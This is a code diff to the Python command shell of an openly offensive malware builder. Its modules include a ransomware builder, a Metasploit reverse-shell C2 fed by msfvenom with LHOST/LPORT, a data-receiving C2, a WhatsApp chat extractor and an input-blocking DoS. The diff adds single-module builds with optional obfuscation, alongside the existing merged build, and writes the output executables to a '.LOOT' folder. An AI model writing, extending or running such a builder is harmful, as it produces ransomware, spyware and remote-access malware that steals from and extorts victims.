@@ -11,7 +11,7 @@ MODULES = {
     'daemon/filedaemon': {'desc': 'Normal C2 server to receive data'},
     'daemon/spider': {'desc': 'Metasploit C2 server (reverse shell/payload delivery)'},
     'daemon/bartmoss': {'desc': 'Ransomware builder'},
-    'daemon/chatwipe': {'desc': 'WhatsApp chat extractor - gets first 8 chats from Chrome login'},
+    'daemon/chatwipe': {'desc': 'WhatsApp chat extractor'},
     'interfaceplug/blackout': {'desc': 'Screen blackout utility'},
     'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
     'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
@@ -142,7 +142,7 @@ def colorize_message(msg):
     lower = msg.lower()
     if any(word in lower for word in ["fail", "error", "unknown", "no modules to remove", "usage"]):
         return f"{RED}{msg}{RESET}"
-    elif any(word in lower for word in ["final merged exe", "set ", "removed module", "all selected modules cleared", "using module"]):
+    elif any(word in lower for word in ["final merged exe", "single module built", "set ", "removed module", "all selected modules cleared", "using module"]):
         return f"{GREEN}{msg}{RESET}"
     else:
         return f"{YELLOW}{msg}{RESET}"
@@ -252,21 +252,24 @@ def shell():
                 if not MODULE_CHAIN:
                     output_lines.append("No modules in chain. Use 'use <module>' to add modules.")
                 else:
-                    output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                     loot_dir = os.path.abspath(os.path.join(os.getcwd(), '.LOOT'))
                     os.makedirs(loot_dir, exist_ok=True)
-                    go_paths = []
-                    bartmoss_original = None
-                    spider_original = None
-                    filedaemon_original = None
-                    for modname in MODULE_CHAIN:
+                    
+                    if len(MODULE_CHAIN) == 1:
+                        # Build single module
+                        modname = MODULE_CHAIN[0]
+                        output_lines.append(f"Building single module: {modname}")
+                        
                         go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
-                        # Patch bartmoss note if needed
+                        bartmoss_original = None
+                        spider_original = None
+                        filedaemon_original = None
+                        
+                        # Patch module-specific options
                         if modname == 'daemon/bartmoss':
                             note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
                             bartmoss_original = patch_bartmoss_note(note)
-                        # Patch spider.go with msfvenom payload if needed
-                        if modname == 'daemon/spider':
+                        elif modname == 'daemon/spider':
                             opts = MODULE_OPTIONS.get('daemon/spider', {})
                             lhost = opts.get('LHOST', '0.0.0.0')
                             lport = opts.get('LPORT', '4444')
@@ -277,34 +280,91 @@ def shell():
                                 output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                 continue
                             spider_original = patch_spider_base64(payload_path)
-                        # Patch filedaemon.go with selected port if needed
-                        if modname == 'daemon/filedaemon':
+                        elif modname == 'daemon/filedaemon':
                             port = MODULE_OPTIONS.get('daemon/filedaemon', {}).get('PORT', '8080')
                             filedaemon_original = patch_filedaemon_port(port)
-                        go_paths.append(go_path)
-                    final_name = BUILD_OPTIONS['exe_name']
-                    final_path = os.path.abspath(os.path.join(loot_dir, final_name))
-                    output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
-                    obf_flag = []
-                    if BUILD_OPTIONS.get('obfuscate'):
-                        obf_flag = ['--obfuscate']
-                    from loading import loading_state
-                    with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
-                        result = subprocess.run([sys.executable, 'compiler.py', '--merge'] + go_paths + [final_path] + obf_flag)
-                    if result.returncode == 0:
-                        output_lines.append(f"Final merged EXE: {final_path}")
+                        
+                        # Generate single module name
+                        module_name = modname.split('/')[-1]
+                        final_name = f"{module_name}.exe"
+                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
+                        
+                        output_lines.append(f"[*] Building single module: {final_name}")
+                        obf_flag = []
+                        if BUILD_OPTIONS.get('obfuscate'):
+                            obf_flag = ['--obfuscate']
+                        
+                        from loading import loading_state
+                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
+                            result = subprocess.run([sys.executable, 'compiler.py', '--go_file', go_path, '--output_exe', final_name] + obf_flag)
+                        
+                        if result.returncode == 0:
+                            output_lines.append(f"Single module built: {final_path}")
+                        else:
+                            output_lines.append("Failed to create single module EXE.")
+                        
+                        # Restore patched files
+                        if bartmoss_original:
+                            restore_bartmoss_go(bartmoss_original)
+                        if spider_original:
+                            restore_spider_go(spider_original)
+                        if filedaemon_original:
+                            restore_filedaemon_go(filedaemon_original)
+                        
+                        MODULE_CHAIN.clear()
                     else:
-                        output_lines.append("Failed to create merged EXE.")
-                    # Restore bartmoss.go if it was patched
-                    if bartmoss_original:
-                        restore_bartmoss_go(bartmoss_original)
-                    # Restore spider.go if it was patched
-                    if spider_original:
-                        restore_spider_go(spider_original)
-                    # Restore filedaemon.go if it was patched
-                    if filedaemon_original:
-                        restore_filedaemon_go(filedaemon_original)
-                    MODULE_CHAIN.clear()
+                        # Build merged modules (existing logic)
+                        output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
+                        go_paths = []
+                        bartmoss_original = None
+                        spider_original = None
+                        filedaemon_original = None
+                        for modname in MODULE_CHAIN:
+                            go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
+                            # Patch bartmoss note if needed
+                            if modname == 'daemon/bartmoss':
+                                note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
+                                bartmoss_original = patch_bartmoss_note(note)
+                            # Patch spider.go with msfvenom payload if needed
+                            if modname == 'daemon/spider':
+                                opts = MODULE_OPTIONS.get('daemon/spider', {})
+                                lhost = opts.get('LHOST', '0.0.0.0')
+                                lport = opts.get('LPORT', '4444')
+                                payload_path = os.path.join('.LOOT', 'spider_payload.exe')
+                                try:
+                                    generate_msfvenom_exe(lhost, lport, payload_path)
+                                except Exception as e:
+                                    output_lines.append(f"Failed to generate msfvenom payload: {e}")
+                                    continue
+                                spider_original = patch_spider_base64(payload_path)
+                            # Patch filedaemon.go with selected port if needed
+                            if modname == 'daemon/filedaemon':
+                                port = MODULE_OPTIONS.get('daemon/filedaemon', {}).get('PORT', '8080')
+                                filedaemon_original = patch_filedaemon_port(port)
+                            go_paths.append(go_path)
+                        final_name = BUILD_OPTIONS['exe_name']
+                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
+                        output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
+                        obf_flag = []
+                        if BUILD_OPTIONS.get('obfuscate'):
+                            obf_flag = ['--obfuscate']
+                        from loading import loading_state
+                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
+                            result = subprocess.run([sys.executable, 'compiler.py', '--merge'] + go_paths + [final_path] + obf_flag)
+                        if result.returncode == 0:
+                            output_lines.append(f"Final merged EXE: {final_path}")
+                        else:
+                            output_lines.append("Failed to create merged EXE.")
+                        # Restore bartmoss.go if it was patched
+                        if bartmoss_original:
+                            restore_bartmoss_go(bartmoss_original)
+                        # Restore spider.go if it was patched
+                        if spider_original:
+                            restore_spider_go(spider_original)
+                        # Restore filedaemon.go if it was patched
+                        if filedaemon_original:
+                            restore_filedaemon_go(filedaemon_original)
+                        MODULE_CHAIN.clear()
             elif cmd == 'clear':
                 MODULE_CHAIN.clear()
                 output_lines.append("All selected modules cleared.")
